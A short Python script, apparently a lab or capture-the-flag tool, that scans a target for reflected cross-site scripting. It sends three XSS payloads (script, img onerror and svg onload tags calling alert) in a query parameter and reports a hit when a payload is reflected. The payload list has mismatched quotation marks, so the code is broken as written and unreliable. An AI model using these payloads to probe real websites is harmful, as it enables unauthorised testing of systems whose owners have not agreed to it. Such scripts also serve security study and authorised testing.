#!/usr/bin/env python3
import requests

def scan_xss(target):
    payloads = ['<script>alert(1)</script>', 
                '"<img src=x onerror=alert(1)>", 
                "'><svg onload=alert(1)>"]
    for payload in payloads:
        resp = requests.get(f"{target}?q={payload}", timeout=5)
        if payload in resp.text:
            print(f"🔥 XSS VULN: {payload}")

if __name__ == "__main__":
    scan_xss("http://10.10.10.x")
